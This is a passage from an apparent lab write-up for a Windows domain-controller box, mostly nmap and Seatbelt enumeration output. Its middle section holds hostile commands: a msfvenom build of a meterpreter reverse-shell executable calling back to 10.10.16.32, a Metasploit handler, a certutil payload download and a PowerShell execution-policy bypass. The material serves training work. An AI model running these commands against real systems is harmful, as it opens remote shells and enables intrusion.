Discovered open port 59766/tcp on 10.13.38.53
Discovered open port 49667/tcp on 10.13.38.53
Completed SYN Stealth Scan at 13:07, 0.88s elapsed (20 total ports)
Initiating Service scan at 13:07
Scanning 20 services on 10.13.38.53
Completed Service scan at 13:08, 60.97s elapsed (20 services on 1 host)
Initiating OS detection (try #1) against 10.13.38.53
Retrying OS detection (try #2) against 10.13.38.53
Initiating Traceroute at 13:08
Completed Traceroute at 13:08, 0.53s elapsed
NSE: Script scanning 10.13.38.53.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:08
NSE Timing: About 99.96% done; ETC: 13:09 (0:00:00 remaining)
Completed NSE at 13:09, 40.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 13.83s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Nmap scan report for 10.13.38.53
Host is up, received echo-reply ttl 127 (0.42s latency).
Scanned at 2026-03-25 13:07:25 CST for 126s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-25 05:07:34Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tea.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tea.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2026-03-25T05:09:18+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: TEA
|   NetBIOS_Domain_Name: TEA
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: tea.vl
|   DNS_Computer_Name: DC.tea.vl
|   DNS_Tree_Name: tea.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-25T05:08:40+00:00
| ssl-cert: Subject: commonName=DC.tea.vl
| Issuer: commonName=DC.tea.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-24T03:11:06
| Not valid after:  2026-09-23T03:11:06
| MD5:     060a 5b8b d67c 4cd3 5440 24ff fd68 5101
| SHA-1:   15c8 146d 170f 420f 15c2 7d5f 779c 2705 3285 dd4c
| SHA-256: 67d7 d886 d90c 3bc7 611e 9f87 6405 4140 e98e a302 0e33 1662 5949 315d ee1e 546b
| -----BEGIN CERTIFICATE-----
| MIIC1jCCAb6gAwIBAgIQFTdOo1GGQ6hOeDDYzO+4kTANBgkqhkiG9w0BAQsFADAU
| MRIwEAYDVQQDEwlEQy50ZWEudmwwHhcNMjYwMzI0MDMxMTA2WhcNMjYwOTIzMDMx
| MTA2WjAUMRIwEAYDVQQDEwlEQy50ZWEudmwwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCuejkDHRNpeG0G22A/+Dree/bqLWRmNWKR1BiepM49vi0CmVtT
| Ve9FYojQG0S6YRjI25kgW1ubraOGncKwIt4AKdIp1iUWgTtV7J9ba7mPQwsZmz+u
| 7Eum3VW83C+fSNXLjjQwk3xVoPkDY9lnVMJ97c8adx84iDaODfFJYoM9HEmYDNoP
| rVtM532nvyGDELWrujajik9Tq6QPp9ghoEsSESsWQIXJ0E82dkxgDdlYLjBmdZJq
| SvmOWDGDPi69nC0ysXCsdbiJzU5smqyBXrBt49HZTskuiFMQFcghm5swqLiHFxER
| AHuTDyDyocwzN/6VvZuFd0783HNgqSoMLjU9AgMBAAGjJDAiMBMGA1UdJQQMMAoG
| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAAeJJqMi5
| gP01BPOSYfoN+HwAoe9eSFGCfULXvdIk+s4+0Tb0F5hbjVhv1+0PMQDizT6huMAw
| MaTqLo+LB0PGha20AizRAZ/cz6a5YK1bSoQNxKKD1HxJfihx7iq/XN6sXcCs7bIQ
| FSMJ6j9cEkVBxzm/4bcTqJajXm0APRAZ3n4JbEHL56KCBvvIi1lc9T/7KB4hMLDT
| 35XzQv50ZrYuBTQrbcawTdSRUUT+IV1Jb93WmsW0yCl5Ke5j62ChvPh0R299Lybc
| xXyGpxHWL0JrLix0ThVUv8JQmZBb0TQCkVnGviUZImIxVE45btDFgB4+LZrb4euK
| aU20Xnc55P5WOQ==
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59727/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
59728/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59730/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59744/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
59766/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.98%E=4%D=3/25%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=69C36E0B%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=A)
SEQ(SP=107%GCD=1%ISR=10F%TI=I%II=I%SS=S%TS=A)
OPS(O1=M542NW8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.083 days (since Wed Mar 25 11:10:42 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 46645/tcp): CLEAN (Timeout)
|   Check 2 (port 21304/tcp): CLEAN (Timeout)
|   Check 3 (port 62523/udp): CLEAN (Timeout)
|   Check 4 (port 28842/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-25T05:08:40
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

TRACEROUTE (using port 59730/tcp)
HOP RTT       ADDRESS
1   351.57 ms 10.10.16.1
2   527.84 ms 10.13.38.53

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:09
Completed NSE at 13:09, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.34 seconds
           Raw packets sent: 108 (8.436KB) | Rcvd: 50 (2.896KB)
```

## Msfconsole
### generate
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Ascension]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.32 LPORT=443 -f exe > ascension.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
```

### listing
```bash
msf > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.16.32
LHOST => 10.10.16.32
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.32:443 
```

### powershell
```bash
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >
```

## Seatbelt
### upload
```bash
certutil.exe -urlcache -split -f http://10.10.16.32/chisel.exe C:\Users\svc_dev\Desktop\chisel.exe
```

### run(权限不足)
> `**<font style="color:rgb(0, 206, 185);background-color:rgb(252, 252, 252);">Get-ScheduledTask</font>**`<font style="color:rgb(23, 23, 23);background-color:rgb(252, 252, 252);"> 是 PowerShell 里查看“计划任务”信息的命令</font>
>
> 根据运行的结果我们发现有很多敏感信息其实我们并没有获取到，Get-ScheduledTask 权限不足
>
> 解决方法是迁移到 Session 1 的进程
>

```bash
powershell -ep bypass -c "Import-Module .\Invoke-Seatbelt.ps1; Invoke-Seatbelt -Command '-group=all'"
```

```bash
PS > powershell -ep bypass -c "Import-Module .\Invoke-Seatbelt.ps1; Invoke-Seatbelt -Command '-group=all'"

====== AMSIProviders ======

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AppLocker ======

ERROR:   [!] Terminating exception running command 'AppLocker': System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.AppLockerCommand.<Execute>d__10.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== ARPTable ======

  Loopback Pseudo-Interface 1 --- Index 1
    Interface Description : Software Loopback Interface 1
    Interface IPs      : ::1, 127.0.0.1
    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static
    239.255.255.250       00-00-00-00-00-00     Static


  Ethernet0 2 --- Index 12
    Interface Description : vmxnet3 Ethernet Adapter
    Interface IPs      : 10.13.38.20
    DNS Servers        : 192.168.10.6

    Internet Address      Physical Address      Type
    10.13.38.2            00-50-56-94-76-73     Dynamic
    10.13.38.255          FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static


  Ethernet1 --- Index 16
    Interface Description : vmxnet3 Ethernet Adapter #3
    Interface IPs      : 192.168.10.39
    DNS Servers        : 192.168.10.6

    Internet Address      Physical Address      Type
    192.168.10.1          00-00-00-00-00-00     Invalid
    192.168.10.2          00-00-00-00-00-00     Invalid
    192.168.10.3          00-00-00-00-00-00     Invalid
    192.168.10.4          00-00-00-00-00-00     Invalid
    192.168.10.5          00-00-00-00-00-00     Invalid
    192.168.10.6          00-50-56-94-99-FB     Dynamic
    192.168.10.7          00-00-00-00-00-00     Invalid
    192.168.10.8          00-00-00-00-00-00     Invalid
    192.168.10.9          00-00-00-00-00-00     Invalid
    192.168.10.10         00-00-00-00-00-00     Invalid
    192.168.10.11         00-00-00-00-00-00     Invalid
    192.168.10.12         00-00-00-00-00-00     Invalid
    192.168.10.13         00-00-00-00-00-00     Invalid
    192.168.10.14         00-00-00-00-00-00     Invalid
    192.168.10.15         00-00-00-00-00-00     Invalid
    192.168.10.16         00-00-00-00-00-00     Invalid
    192.168.10.17         00-00-00-00-00-00     Invalid
    192.168.10.18         00-00-00-00-00-00     Invalid
    192.168.10.19         00-00-00-00-00-00     Invalid
    192.168.10.20         00-00-00-00-00-00     Invalid
    192.168.10.21         00-00-00-00-00-00     Invalid
    192.168.10.22         00-00-00-00-00-00     Invalid
    192.168.10.23         00-00-00-00-00-00     Invalid
    192.168.10.24         00-00-00-00-00-00     Invalid
    192.168.10.25         00-00-00-00-00-00     Invalid
    192.168.10.26         00-00-00-00-00-00     Invalid
    192.168.10.27         00-00-00-00-00-00     Invalid
    192.168.10.28         00-00-00-00-00-00     Invalid
    192.168.10.29         00-00-00-00-00-00     Invalid
    192.168.10.30         00-00-00-00-00-00     Invalid
    192.168.10.31         00-00-00-00-00-00     Invalid
    192.168.10.32         00-00-00-00-00-00     Invalid
    192.168.10.33         00-00-00-00-00-00     Invalid
    192.168.10.34         00-00-00-00-00-00     Invalid
    192.168.10.35         00-00-00-00-00-00     Invalid
    192.168.10.36         00-00-00-00-00-00     Invalid
    192.168.10.37         00-00-00-00-00-00     Invalid
    192.168.10.38         00-00-00-00-00-00     Invalid
    192.168.10.40         00-00-00-00-00-00     Invalid
    192.168.10.41         00-00-00-00-00-00     Invalid
    192.168.10.42         00-00-00-00-00-00     Invalid
    192.168.10.43         00-00-00-00-00-00     Invalid
    192.168.10.44         00-00-00-00-00-00     Invalid
    192.168.10.45         00-00-00-00-00-00     Invalid
    192.168.10.46         00-00-00-00-00-00     Invalid
    192.168.10.47         00-00-00-00-00-00     Invalid
    192.168.10.48         00-00-00-00-00-00     Invalid
    192.168.10.49         00-00-00-00-00-00     Invalid
    192.168.10.50         00-00-00-00-00-00     Invalid
    192.168.10.51         00-00-00-00-00-00     Invalid
    192.168.10.52         00-00-00-00-00-00     Invalid
    192.168.10.53         00-00-00-00-00-00     Invalid
    192.168.10.54         00-00-00-00-00-00     Invalid
    192.168.10.55         00-00-00-00-00-00     Invalid
    192.168.10.56         00-00-00-00-00-00     Invalid
    192.168.10.57         00-00-00-00-00-00     Invalid
    192.168.10.58         00-00-00-00-00-00     Invalid
    192.168.10.59         00-00-00-00-00-00     Invalid
    192.168.10.60         00-00-00-00-00-00     Invalid
    192.168.10.61         00-00-00-00-00-00     Invalid
    192.168.10.62         00-00-00-00-00-00     Invalid
    192.168.10.63         00-00-00-00-00-00     Invalid
    192.168.10.64         00-00-00-00-00-00     Invalid
    192.168.10.65         00-00-00-00-00-00     Invalid
    192.168.10.66         00-00-00-00-00-00     Invalid
    192.168.10.67         00-00-00-00-00-00     Invalid
    192.168.10.68         00-00-00-00-00-00     Invalid
    192.168.10.69         00-00-00-00-00-00     Invalid
    192.168.10.70         00-00-00-00-00-00     Invalid
    192.168.10.71         00-00-00-00-00-00     Invalid
    192.168.10.72         00-00-00-00-00-00     Invalid
    192.168.10.73         00-00-00-00-00-00     Invalid
    192.168.10.74         00-00-00-00-00-00     Invalid
    192.168.10.75         00-00-00-00-00-00     Invalid
    192.168.10.76         00-00-00-00-00-00     Invalid
    192.168.10.77         00-00-00-00-00-00     Invalid
    192.168.10.78         00-00-00-00-00-00     Invalid
    192.168.10.79         00-00-00-00-00-00     Invalid
    192.168.10.80         00-00-00-00-00-00     Invalid
    192.168.10.81         00-00-00-00-00-00     Invalid
    192.168.10.82         00-00-00-00-00-00     Invalid
    192.168.10.83         00-00-00-00-00-00     Invalid
    192.168.10.84         00-00-00-00-00-00     Invalid
    192.168.10.85         00-00-00-00-00-00     Invalid
    192.168.10.86         00-00-00-00-00-00     Invalid
    192.168.10.87         00-00-00-00-00-00     Invalid
    192.168.10.88         00-00-00-00-00-00     Invalid
    192.168.10.89         00-00-00-00-00-00     Invalid
    192.168.10.90         00-00-00-00-00-00     Invalid
    192.168.10.91         00-00-00-00-00-00     Invalid
    192.168.10.92         00-00-00-00-00-00     Invalid
    192.168.10.93         00-00-00-00-00-00     Invalid
    192.168.10.94         00-00-00-00-00-00     Invalid
    192.168.10.95         00-00-00-00-00-00     Invalid
    192.168.10.96         00-00-00-00-00-00     Invalid
    192.168.10.97         00-00-00-00-00-00     Invalid
    192.168.10.98         00-00-00-00-00-00     Invalid
    192.168.10.99         00-00-00-00-00-00     Invalid
    192.168.10.100        00-00-00-00-00-00     Invalid
    192.168.10.101        00-00-00-00-00-00     Invalid
    192.168.10.102        00-00-00-00-00-00     Invalid
    192.168.10.103        00-00-00-00-00-00     Invalid
    192.168.10.104        00-00-00-00-00-00     Invalid
    192.168.10.105        00-00-00-00-00-00     Invalid
    192.168.10.106        00-00-00-00-00-00     Invalid
    192.168.10.107        00-00-00-00-00-00     Invalid
    192.168.10.108        00-00-00-00-00-00     Invalid
    192.168.10.109        00-00-00-00-00-00     Invalid
    192.168.10.110        00-00-00-00-00-00     Invalid
    192.168.10.111        00-00-00-00-00-00     Invalid
    192.168.10.112        00-00-00-00-00-00     Invalid
    192.168.10.113        00-00-00-00-00-00     Invalid
    192.168.10.114        00-00-00-00-00-00     Invalid
    192.168.10.115        00-00-00-00-00-00     Invalid
    192.168.10.116        00-00-00-00-00-00     Invalid
    192.168.10.117        00-00-00-00-00-00     Invalid
    192.168.10.118        00-00-00-00-00-00     Invalid
    192.168.10.119        00-00-00-00-00-00     Invalid
    192.168.10.120        00-00-00-00-00-00     Invalid
    192.168.10.121        00-00-00-00-00-00     Invalid
    192.168.10.122        00-00-00-00-00-00     Invalid
    192.168.10.123        00-00-00-00-00-00     Invalid
    192.168.10.124        00-00-00-00-00-00     Invalid
    192.168.10.125        00-00-00-00-00-00     Invalid
    192.168.10.126        00-00-00-00-00-00     Invalid
    192.168.10.127        00-00-00-00-00-00     Invalid
    192.168.10.128        00-00-00-00-00-00     Invalid
    192.168.10.129        00-00-00-00-00-00     Invalid
    192.168.10.130        00-00-00-00-00-00     Invalid
    192.168.10.131        00-00-00-00-00-00     Invalid
    192.168.10.132        00-00-00-00-00-00     Invalid
    192.168.10.133        00-00-00-00-00-00     Invalid
    192.168.10.134        00-00-00-00-00-00     Invalid
    192.168.10.135        00-00-00-00-00-00     Invalid
    192.168.10.136        00-00-00-00-00-00     Invalid
    192.168.10.137        00-00-00-00-00-00     Invalid
    192.168.10.138        00-00-00-00-00-00     Invalid
    192.168.10.139        00-00-00-00-00-00     Invalid
    192.168.10.140        00-00-00-00-00-00     Invalid
    192.168.10.141        00-00-00-00-00-00     Invalid
    192.168.10.142        00-00-00-00-00-00     Invalid
    192.168.10.143        00-00-00-00-00-00     Invalid
    192.168.10.144        00-00-00-00-00-00     Invalid
    192.168.10.145        00-00-00-00-00-00     Invalid
    192.168.10.146        00-00-00-00-00-00     Invalid
    192.168.10.147        00-00-00-00-00-00     Invalid
    192.168.10.148        00-00-00-00-00-00     Invalid
    192.168.10.149        00-00-00-00-00-00     Invalid
    192.168.10.150        00-00-00-00-00-00     Invalid
    192.168.10.151        00-00-00-00-00-00     Invalid
    192.168.10.152        00-00-00-00-00-00     Invalid
    192.168.10.153        00-00-00-00-00-00     Invalid
    192.168.10.154        00-00-00-00-00-00     Invalid
    192.168.10.155        00-00-00-00-00-00     Invalid
    192.168.10.156        00-00-00-00-00-00     Invalid
    192.168.10.157        00-00-00-00-00-00     Invalid
    192.168.10.158        00-00-00-00-00-00     Invalid
    192.168.10.159        00-00-00-00-00-00     Invalid
    192.168.10.160        00-00-00-00-00-00     Invalid
    192.168.10.161        00-00-00-00-00-00     Invalid
    192.168.10.162        00-00-00-00-00-00     Invalid
    192.168.10.163        00-00-00-00-00-00     Invalid
    192.168.10.164        00-00-00-00-00-00     Invalid
    192.168.10.165        00-00-00-00-00-00     Invalid
    192.168.10.166        00-00-00-00-00-00     Invalid
    192.168.10.167        00-00-00-00-00-00     Invalid
    192.168.10.168        00-00-00-00-00-00     Invalid
    192.168.10.169        00-00-00-00-00-00     Invalid
    192.168.10.170        00-00-00-00-00-00     Invalid
    192.168.10.171        00-00-00-00-00-00     Invalid
    192.168.10.172        00-00-00-00-00-00     Invalid
    192.168.10.173        00-00-00-00-00-00     Invalid
    192.168.10.174        00-00-00-00-00-00     Invalid
    192.168.10.175        00-00-00-00-00-00     Invalid
    192.168.10.176        00-00-00-00-00-00     Invalid
    192.168.10.177        00-00-00-00-00-00     Invalid
    192.168.10.178        00-00-00-00-00-00     Invalid
    192.168.10.179        00-00-00-00-00-00     Invalid
    192.168.10.180        00-00-00-00-00-00     Invalid
    192.168.10.181        00-00-00-00-00-00     Invalid
    192.168.10.182        00-00-00-00-00-00     Invalid
    192.168.10.183        00-00-00-00-00-00     Invalid
    192.168.10.184        00-00-00-00-00-00     Invalid
    192.168.10.185        00-00-00-00-00-00     Invalid
    192.168.10.186        00-00-00-00-00-00     Invalid
    192.168.10.187        00-00-00-00-00-00     Invalid
    192.168.10.188        00-00-00-00-00-00     Invalid
    192.168.10.189        00-00-00-00-00-00     Invalid
    192.168.10.190        00-00-00-00-00-00     Invalid
    192.168.10.191        00-00-00-00-00-00     Invalid
    192.168.10.192        00-00-00-00-00-00     Invalid
    192.168.10.193        00-00-00-00-00-00     Invalid
    192.168.10.194        00-00-00-00-00-00     Invalid
    192.168.10.195        00-00-00-00-00-00     Invalid
    192.168.10.196        00-00-00-00-00-00     Invalid
    192.168.10.197        00-00-00-00-00-00     Invalid
    192.168.10.198        00-00-00-00-00-00     Invalid
    192.168.10.199        00-00-00-00-00-00     Invalid
    192.168.10.200        00-00-00-00-00-00     Invalid
    192.168.10.201        00-00-00-00-00-00     Invalid
    192.168.10.202        00-00-00-00-00-00     Invalid
    192.168.10.203        00-00-00-00-00-00     Invalid
    192.168.10.204        00-00-00-00-00-00     Invalid
    192.168.10.205        00-00-00-00-00-00     Invalid
    192.168.10.206        00-00-00-00-00-00     Invalid
    192.168.10.207        00-00-00-00-00-00     Invalid
    192.168.10.208        00-00-00-00-00-00     Invalid
    192.168.10.209        00-00-00-00-00-00     Invalid
    192.168.10.210        00-00-00-00-00-00     Invalid
    192.168.10.211        00-00-00-00-00-00     Invalid
    192.168.10.212        00-00-00-00-00-00     Invalid
    192.168.10.213        00-00-00-00-00-00     Invalid
    192.168.10.214        00-00-00-00-00-00     Invalid
    192.168.10.215        00-00-00-00-00-00     Invalid
    192.168.10.216        00-00-00-00-00-00     Invalid
    192.168.10.217        00-00-00-00-00-00     Invalid
    192.168.10.218        00-00-00-00-00-00     Invalid
    192.168.10.219        00-00-00-00-00-00     Invalid
    192.168.10.220        00-00-00-00-00-00     Invalid
    192.168.10.221        00-00-00-00-00-00     Invalid
    192.168.10.222        00-00-00-00-00-00     Invalid
    192.168.10.223        00-00-00-00-00-00     Invalid
    192.168.10.224        00-00-00-00-00-00     Invalid
    192.168.10.225        00-00-00-00-00-00     Invalid
    192.168.10.226        00-00-00-00-00-00     Invalid
    192.168.10.227        00-00-00-00-00-00     Invalid
    192.168.10.228        00-00-00-00-00-00     Invalid
    192.168.10.229        00-00-00-00-00-00     Invalid
    192.168.10.230        00-00-00-00-00-00     Invalid
    192.168.10.231        00-00-00-00-00-00     Invalid
    192.168.10.232        00-00-00-00-00-00     Invalid
    192.168.10.233        00-00-00-00-00-00     Invalid
    192.168.10.234        00-00-00-00-00-00     Invalid
    192.168.10.235        00-00-00-00-00-00     Invalid
    192.168.10.236        00-00-00-00-00-00     Invalid
    192.168.10.237        00-00-00-00-00-00     Invalid
    192.168.10.238        00-00-00-00-00-00     Invalid
    192.168.10.239        00-00-00-00-00-00     Invalid
    192.168.10.240        00-00-00-00-00-00     Invalid
    192.168.10.241        00-00-00-00-00-00     Invalid
    192.168.10.242        00-00-00-00-00-00     Invalid
    192.168.10.243        00-00-00-00-00-00     Invalid
    192.168.10.244        00-00-00-00-00-00     Invalid
    192.168.10.245        00-00-00-00-00-00     Invalid
    192.168.10.246        00-00-00-00-00-00     Invalid
    192.168.10.247        00-00-00-00-00-00     Invalid
    192.168.10.248        00-00-00-00-00-00     Invalid
    192.168.10.249        00-00-00-00-00-00     Invalid
    192.168.10.250        00-00-00-00-00-00     Invalid
    192.168.10.251        00-00-00-00-00-00     Invalid
    192.168.10.252        00-00-00-00-00-00     Invalid
    192.168.10.253        00-00-00-00-00-00     Invalid
    192.168.10.254        00-00-00-00-00-00     Invalid
    192.168.10.255        FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static
    239.255.255.250       01-00-5E-7F-FF-FA     Static


====== AuditPolicies ======

====== AuditPolicyRegistry ======

====== AutoRuns ======


  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\WINDOWS\system32\SecurityHealthSystray.exe
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
====== azuread ======

    Could not enumerate NetAadJoinInfo
    SeamlessSignOnDomainTrusted : (not configured)
====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CurrentUser\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
CurrentUser\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
